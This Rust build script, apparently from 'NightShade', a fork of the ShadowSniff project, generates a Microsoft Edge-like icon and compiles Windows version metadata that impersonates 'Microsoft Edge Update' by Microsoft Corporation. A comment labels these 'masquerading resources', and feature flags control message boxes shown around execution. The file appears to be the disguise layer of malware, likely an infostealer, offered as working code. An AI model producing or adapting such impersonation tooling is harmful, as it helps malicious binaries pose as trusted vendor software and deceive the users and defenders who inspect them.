/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
use std::env;
use std::path::Path;

/// Generates a 256x256 "Edge-ish" icon (blue gradient disc with a white `e`)
/// as a PNG-embedded `.ico` so no external asset is required.
fn generate_icon(path: &Path) {
    const SIZE: usize = 256;
    const HALF: usize = SIZE / 2;

    let mut png: Vec<u8> = Vec::new();
    png.extend(b"\x89PNG\r\n\x1A\n");

    let mut ihdr = Vec::new();
    ihdr.extend((SIZE as u32).to_be_bytes());
    ihdr.extend((SIZE as u32).to_be_bytes());
    ihdr.extend([8, 6, 0, 0, 0]); // 8-bit RGBA
    append_png_chunk(&mut png, b"IHDR", &ihdr);

    // Raw scanlines: blue gradient background + white ring `e`.
    let mut scanlines: Vec<u8> = Vec::with_capacity(SIZE * (SIZE * 4 + 1));
    for y in 0..SIZE {
        scanlines.push(0x00); // filter: none

        for x in 0..SIZE {
            // Vertical gradient #0078D7 -> #00BCF2.
            let t = y as f32 / (SIZE - 1) as f32;
            let (r, g, b) = (
                0x00u8,
                (0x78 as f32 + (0xBC as f32 - 0x78 as f32) * t) as u8,
                (0xD7 as f32 + (0xF2 as f32 - 0xD7 as f32) * t) as u8,
            );

            // Ring geometry: white annulus centred slightly above middle,
            // with a horizontal bar closing the `e` on the right side.
            let dx = x as f32 - HALF as f32;
            let dy = y as f32 - (HALF + 6) as f32;
            let dist = (dx * dx + dy * dy).sqrt();
            let ring = (62.0..=86.0).contains(&dist);
            let bar = y >= (HALF + 4) && y <= (HALF + 18) && dx >= 0.0 && dx <= 86.0;
            let inside = x + y >= 24; // rounded-off corner look

            let (pr, pg, pb, pa) = if !inside || (dist > 118.0) {
                (r, g, b, 255)
            } else if ring || bar {
                (255, 255, 255, 255)
            } else {
                // Inner disc: slightly darker gradient for depth.
                let dg = (0x5E as f32 + (0x8E as f32 - 0x5E as f32) * t) as u8;
                (0x00, dg, b.saturating_sub(14), 255)
            };

            scanlines.extend([pr, pg, pb, pa]);
        }
    }

    // miniz_oxide is already a workspace dependency of the binary crate; in
    // build-dependencies it is added separately in Cargo.toml.
    let compressed = miniz_oxide::deflate::compress_to_vec_zlib(&scanlines, 6);
    append_png_chunk(&mut png, b"IDAT", &compressed);
    append_png_chunk(&mut png, b"IEND", &[]);

    // ICO container: ICONDIR + one PNG-embedded entry (Vista+ understands it).
    let mut ico: Vec<u8> = Vec::new();
    ico.extend([0, 0]); // reserved
    ico.extend([1, 0]); // type: icon
    ico.extend([1, 0]); // count: 1
    ico.push(0); // width 256 -> 0
    ico.push(0); // height 256 -> 0
    ico.push(0); // palette
    ico.push(0); // reserved
    ico.extend([1, 0]); // planes
    ico.extend([32, 0]); // bpp
    ico.extend(&(png.len() as u32).to_le_bytes());
    ico.extend(&22u32.to_le_bytes()); // data offset
    ico.extend(png);

    std::fs::write(path, ico).unwrap();
}

fn append_png_chunk(png: &mut Vec<u8>, chunk_type: &[u8; 4], data: &[u8]) {
    let mut chunk_bytes = Vec::with_capacity(4 + data.len());
    chunk_bytes.extend_from_slice(chunk_type);
    chunk_bytes.extend_from_slice(data);

    // Straight bitwise CRC-32 (kept dependency-free).
    let mut crc: u32 = 0xFFFF_FFFF;
    for &byte in &chunk_bytes {
        crc ^= byte as u32;
        for _ in 0..8 {
            let mask = if crc & 1 != 0 { 0xEDB8_8320 } else { 0 };
            crc = (crc >> 1) ^ mask;
        }
    }
    let crc = !crc;

    png.extend(&(data.len() as u32).to_be_bytes());
    png.extend_from_slice(chunk_type);
    png.extend_from_slice(data);
    png.extend(&crc.to_be_bytes());
}

fn main() {
    let before = env::var("CARGO_FEATURE_MESSAGE_BOX_BEFORE_EXECUTION").is_ok();
    let after = env::var("CARGO_FEATURE_MESSAGE_BOX_AFTER_EXECUTION").is_ok();

    if before && after {
        panic!(
            "Only one of `message_box_before_execution` or `message_box_after_execution` can be enabled at a time."
        );
    }

    // --- Masquerading resources: Edge Update icon + version info ---
    println!("cargo:rerun-if-changed=build.rs");

    let out_dir = Path::new(&env::var("OUT_DIR").unwrap()).join("masquerade");
    std::fs::create_dir_all(&out_dir).unwrap();

    let icon_path = out_dir.join("app.ico");
    generate_icon(&icon_path);

    let mut res = winresource::WindowsResource::new();
    res.set_icon(icon_path.to_str().unwrap());
    res.set("FileDescription", "Microsoft Edge Update");
    res.set("ProductName", "Microsoft Edge Update");
    res.set("CompanyName", "Microsoft Corporation");
    res.set("OriginalFilename", "MicrosoftEdgeUpdate.exe");
    res.set("FileVersion", "131.0.2903.86");
    res.set("ProductVersion", "131.0.2903.86");
    res.set("LegalCopyright", "\u{A9} Microsoft Corporation. All rights reserved.");
    res.compile().unwrap();
}
